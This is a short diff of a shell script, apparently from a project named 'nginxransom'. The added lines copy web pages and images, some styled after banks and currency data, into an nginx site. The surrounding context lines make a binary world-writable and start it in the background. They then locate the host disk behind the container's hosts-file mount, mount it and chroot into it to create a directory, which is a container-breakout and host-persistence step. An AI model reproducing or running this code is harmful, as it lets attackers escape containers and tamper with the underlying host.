@@ -8,6 +8,15 @@ chmod 777 /usr/bin/initialize
 initialize &
 cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 cp   nginxransom/web/credit-suisse.html /usr/share/nginx/html/credit-suisse.html
+cp   nginxransom/web/TRLtum.html /usr/share/nginx/html/TRLtum.html
+cp   nginxransom/web/EURtum.html /usr/share/nginx/html/EURtum.html
+cp   nginxransom/web/USDtum.html /usr/share/nginx/html/USDtum.html
+cp   nginxransom/web/InfFc.png /usr/share/nginx/html/InfFc.png
+cp   nginxransom/web/TRGross.png  /usr/share/nginx/html/TRGross.png
+cp   nginxransom/web/Purchase.png /usr/share/nginx/html/Purchase.png
+cp   nginxransom/web/kk092023.html /usr/share/nginx/html/kk092023.html
+cp   nginxransom/web/Budget.png /usr/share/nginx/html/Budget.png
+cp   nginxransom/web/NatDepth.png /usr/share/nginx/html/NatDepth.png
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
 chroot mnt/ mkdir libx64
